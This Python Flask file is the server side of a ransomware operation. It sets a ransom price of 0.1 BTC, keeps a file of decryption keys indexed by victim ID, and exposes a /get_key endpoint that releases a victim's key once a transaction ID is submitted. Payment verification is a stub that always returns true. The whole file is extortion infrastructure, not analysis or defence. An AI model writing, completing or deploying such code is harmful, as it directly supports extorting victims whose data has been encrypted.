from flask import Flask, request, render_template, jsonify
import os

app = Flask(__name__)

RANSOM_PRICE = 0.1 # in BTC

def loaddb():
    database = []
    try:
        with open("database.txt", "r") as f:
            database = [line.strip() for line in f]
        return database
    except FileNotFoundError:
        return []

def get_key(id):
    database = loaddb()
    if 0 <= id < len(database):
        return database[id]
    return None

def verify_transaction(transaction_id):
    return True

@app.route('/')
def index():
    return render_template('index.html', ransom_price=RANSOM_PRICE)

@app.route('/get_key', methods=['POST'])
def fetch_key():
    try:
        id = int(request.form['id'])
        transaction_id = request.form['transaction']
        
        key = get_key(id)
        if not key:
            return jsonify({'error': 'Key not found'}), 404
        if verify_transaction(transaction_id):
            return jsonify({'key': key})
        return jsonify({'error': 'Transaction not verified'}), 404
    except ValueError:
        return jsonify({'error': 'Invalid ID'}), 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
